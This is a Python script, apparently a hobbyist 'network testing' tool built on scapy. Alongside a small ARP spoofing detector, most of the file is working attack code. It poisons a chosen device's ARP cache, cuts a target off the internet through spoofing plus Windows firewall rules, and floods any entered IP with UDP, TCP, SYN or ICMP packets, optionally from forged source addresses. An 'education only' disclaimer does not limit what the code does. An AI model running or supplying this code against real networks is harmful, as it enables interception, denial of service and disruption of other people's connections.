# BLOCK   netsh advfirewall firewall add rule name="BLOCKED "+IP interface=any dir=in action=block remoteip=IP
# UNBLOCK  netsh advfirewall firewall delete rule name="BLOCKED "+IP interface=any dir=in action=block remoteip=IP
import scapy.layers.inet

try:
    import os
    from scapy.layers.inet import *
    import requests
    import socket
    from scapy.all import ARP, srp, Ether, send, sniff
except ImportError:
    import os
    print(" INSTALLING... libs")
    os.system("python -m pip install scapy")
    os.system("python -m pip install requests")
    os.system("python -m pip install socket")

warning = """"
This script is for education perpices ONLY.
I am not resposible for anything done by this script.

Please follow the instructios or will can face error on networking bugs.

"""
print(warning)


# target = input("Enter the target local IP (ex. 192.168.x.x | ex. 10.x.x.x ) >> ")
# host = input("Enter the host local IP (ex. 192.168.x.1 | ex. 10.x.x.1 ) >> ")

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    # os.system('netsh advfirewall firewall add rule name="BLOCKED "+'+target_ip+' interface=any dir=in action=block remoteip='+target_ip)
    # get the MAC address of the default interface we are using
    self_mac = ARP().hwsrc
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=1)
    # os.system('netsh advfirewall firewall delete rule name="BLOCKED "' +target_ip+' interface=any dir=in action=block remoteip='+target_ip)
    # interface=any action=block
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def startARPspoffing(target, host):
    try:
        print(" " + target + " is blocked | host " + host + " | CTRL+C to stop")
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host)
            # telling the `host` that we are the `target`
            spoof(host, target)
            # sleep for one second
            # 0.3
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)


def startKick(target, host):
    try:
        print(" " + target + " is blocked | host " + host + " | CTRL+C to stop")
        os.system(
            "netsh advfirewall firewall add rule name=\"BLOCKED \"" + target + " action=block dir=in localip=" + target)
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host)
            # telling the `host` that we are the `target`
            spoof(host, target)
            # sleep for one second
            # 0.3
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
        os.system("netsh advfirewall firewall delete rule name=\"BLOCKED \"" +
                  target + " action=block dir=in localip=" + target)


def ARPscanList(target_ip):
    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    # a list of clients, we will fill this in the upcoming loop
    clients = []
    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    # format client['ip'], client['mac']
    return clients


def ARPscan(target_ip):
    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether / arp
    resultt = srp(packet, timeout=3, verbose=0)[0]
    # a list of clients, we will fill this in the upcoming loop
    clients = []
    for sent, received in resultt:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    # print clients
    print("Available devices in the network:")
    print("IP" + " " * 18 + "MAC")
    for clientt in clients:
        print("{:16}    {}".format(clientt['ip'], clientt['mac']))  # '''


def get_mac_Detect(ips):
    arp_request = scapy.ARP(pdst=ips)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def sniff_Detect():
    while True:
        try:
            print(" Checking...")
            sniff(filter="arp", count=1, store=1, prn=process_sniffed_packet)
        except KeyboardInterrupt:
            print(" CTRL + C detected | Stoping the detection.")
            break


def process_sniffed_packet(packet):
    if packet.op == 2:
        try:
            real_mac = get_mac(packet.psrc)
            response_mac = packet.hwsrc
            if real_mac != response_mac:
                print("[+] You are under attack!!")
        except IndexError:
            pass


def scan(ipp, portt):
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    scanner.settimeout(1)
    try:
        scanner.connect((ipp, portt))
        scanner.close()
        return True
    except Exception:
        return False

menu = """
Help menu:
    1 - detector >- It detects ARP spoofing or ARP positing
    2 - scans your network | NOTE: that this may not show all the IPs that are connected.
    3 - ARP spoofing test or ARP positing test >- by blocking the internet
    4 - quit >- you will stop this program
    5 - help >- shows this menu
    6 - fix network >- in case of an ARP spoofing or ARP positing attack
    7 - socket port scanner >- a simple port scanner that will show the holes in your firewall
    8 - DoS attack test >- This will flood your network to test the protection of it
    9 - block IP >- it will block the internet by ARP spoofing
"""
print(menu)
selfIP = requests.get('https://api.ipify.org').text
while True:
    try:
        cmd = input("Command Line >> ")
        if cmd == '8' or cmd == 'dos':
            DosMenu = """
            DoS attack types

                1 - SOCKET
                2 - TCP
                3 - TCP SYN
                4 - UDP
                5 - ICMP
                
            """
            print(DosMenu)
            DosType = input(" Choose your option > ")
            if DosType == "quit" or DosType == 'QUIT':
                break
            DosPortStr = input(" Enter one port you want to test it on > ")
            DosPort = int(DosPortStr)
            IPadress = input(
                " Do you want to give an IP address | press ENTER for your IP , enter an IP address for the tests > ")
            spoofIP = input(" Enter spoof src IP [Press enter for none]: ")
            x = 0
            sent = 0
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            byteDosStr = input(" Enter the amout of bytes in one packet >> ")
            byteDos = bytearray(int(byteDosStr))
            if DosType == "1" or DosType == 'socket' or DosType == "SOCKET":
                if IPadress == "":
                    while True:
                        try:
                            client.sendto(byteDos, (selfIP, DosPort))
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, selfIP, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stopped")
                            break
                else:
                    while True:
                        try:
                            client.sendto(byteDos, (IPadress, DosPort))
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, IPadress, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stopped")
                            break

            if DosType == "2" or DosType == "TCP" or DosType == "tcp":
                x = 0
                sent = 0
                if spoofIP != "":
                    TCP1 = Ether() / IP(dst=selfIP, src=spoofIP) / TCP(dport=DosPort)
                    TCP2 = Ether() / IP(dst=IPadress, src=spoofIP) / TCP(dport=DosPort)
                else:
                    TCP1 = Ether() / IP(dst=selfIP, src=selfIP) / TCP(dport=DosPort)
                    TCP2 = Ether() / IP(dst=IPadress, src=selfIP) / TCP(dport=DosPort)
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
                            send(TCP1, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{} """
                            print(txt.format(sent, x, selfIP, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break
                else:
                    while True:
                        try:
                            send(TCP2, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, IPadress, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break

            if DosType == "3" or DosType == "SYN" or DosType == "syn":
                x = 0
                sent = 0
                if spoofIP != "":
                    TCP1 = Ether() / IP(dst=selfIP, src=spoofIP) / TCP(dport=DosPort, flags='S')
                    TCP2 = Ether() / IP(dst=IPadress, src=spoofIP) / TCP(dport=DosPort, flags='S')
                else:
                    TCP1 = Ether() / IP(dst=selfIP, src=selfIP) / TCP(dport=DosPort, flags='S')
                    TCP2 = Ether() / IP(dst=IPadress, src=selfIP) / TCP(dport=DosPort, flags='S')
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
                            send(TCP1, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, selfIP, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break
                else:
                    while True:
                        try:
                            send(TCP2, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, IPadress, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break

            if DosType == "4" or DosType == "UDP" or DosType == "udp":
                x = 0
                sent = 0
                if spoofIP != "":
                    TCP1 = Ether() / IP(dst=selfIP, src=spoofIP) / UDP(dport=DosPort)
                    TCP2 = Ether() / IP(dst=IPadress, src=spoofIP) / UDP(dport=DosPort)
                else:
                    TCP1 = Ether() / IP(dst=selfIP, src=selfIP) / UDP(dport=DosPort)
                    TCP2 = Ether() / IP(dst=IPadress, src=selfIP) / UDP(dport=DosPort)
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
                            send(TCP1, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, selfIP, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break
                else:
                    while True:
                        try:
                            send(TCP2, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""" : """"""{}"""
                            print(txt.format(sent, x, IPadress, DosPort))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break

            if DosType == "5" or DosType == "ICMP" or DosType == "icmp" or DosType == 'ping' or DosType == "PING":
                x = 0
                sent = 0
                if spoofIP != "":
                    TCP1 = Ether() / IP(dst=selfIP, src=spoofIP) / ICMP()
                    TCP2 = Ether() / IP(dst=IPadress, src=spoofIP) / ICMP()
                else:
                    TCP1 = Ether() / IP(dst=selfIP, src=selfIP) / ICMP()
                    TCP2 = Ether() / IP(dst=IPadress, src=selfIP) / ICMP()
                byteDos = bytearray(int(byteDosStr))
                if IPadress == "":
                    while True:
                        try:
                            send(TCP1, verbose=False)
                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""""""""""""
                            print(txt.format(sent, x, selfIP))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break
                else:
                    while True:
                        try:
                            send(TCP2, verbose=False)

                            x += int(byteDosStr)
                            sent += 1
                            txt = """Sended """"""{}"""""" packets, bytes sended """"""{}"""""" to """"""{}"""""""""""""""
                            print(txt.format(sent, x, IPadress))
                        except KeyboardInterrupt:
                            print(" Detected CTRL + C | The attack is stoped")
                            break

        if cmd == '7' or cmd == 'socket port scanner' or cmd == "socket port scan" or cmd == 'port scanner':
            PortRange = input(" Enter the port ranger | ex. 20,100 | from 20 to 100 >> ")
            print(" I recommend using Nmap port scanner")
            filltered = PortRange.split(",")
            for port in range(int(filltered[0]), int(filltered[1])):
                try:
                    result = scan(selfIP, port)
                    if result:
                        OpenPort = int(port)
                        print(" Port is " + str(OpenPort) + " Open!")
                        continue
                    else:
                        if int(port) == int(filltered[1]):
                            print(" No open ports")
                        continue
                except KeyboardInterrupt:
                    print(" CTRL+C detected | Port scanner have stopped.")
                    break
        if cmd == '6' or cmd == 'fix':
            hostNew = input(" Enter the host | ex. 192.168.x.1 >> ")
            victom = input(" Enter the victom local IP | ex. 192.168.x.x >> ")
            restore(victom, hostNew)
            restore(hostNew, victom)
            # os.system('netsh advfirewall firewall delete rule name="BLOCKED "' +victom+' interface=any dir=in action=block remoteip='+victom)
            os.system("netsh advfirewall firewall delete rule name=\"BLOCKED \"" +
                      victom + " dir=in localip=" + victom)
            print(" Network fixed")
        if cmd == '4' or cmd == 'quit':
            break
        if cmd == '5' or cmd == 'help' or cmd == '?':
            print(menu)
        if cmd == '1' or cmd == 'detector':
            sniff_Detect()
        if cmd == '2' or cmd == 'scan':
            '''
            target = input(" Enter the local IP range (ex. 192.168.x.1/24) >> ")
            toaster.show_toast("ARP Shield", "IPs connected to the Network >>"+str(ARPscanList(target)))
            ARPscan(target)
            '''
            IPrange = input(
                " Enter the range of the local IP addresses | ex. 192.168.x.1/24 >> ")
            host = input(" Enter the host local IP | ex. 192.168.x.1 >> ")
            unwanted = []
            for client in ARPscanList(IPrange):
                unwanted.append(client['ip'])
            print(" Discovery all IPs " + str(unwanted)+" on the network!")
        if cmd == '3' or cmd == 'ARP':
            print(" Only one IP can be spoffed!")
            targetIP = input(" Enter the local IP of the target | ex. 192.168.x.x | Only one at a time >> ")
            host = input(" Enter the host local IP | ex. 192.168.x.1 >> ")
            print(" Only one IP can be spoffed!")
            startARPspoffing(targetIP, host)
        if cmd == '9' or cmd == 'block':
            windows = input(" Are you on windows 10 | Don't lie or you will mess up your network | Y/N > ")
            if windows == 'y' or windows == "Y":
                print(" Only one IP can be blocked!")
                targetIP = input(" Enter the local IP of the target | ex. 192.168.x.x | Only one at a time >> ")
                host = input(" Enter the host local IP | ex. 192.168.x.1 >> ")
                print(" Only one IP can be blocked!")
                startKick(targetIP, host)
            else:
                print(" You must be on windows 10 in order for the block to work!")
                break
    except KeyboardInterrupt:
        print(' Stopping the script...')
        exit()
exit()
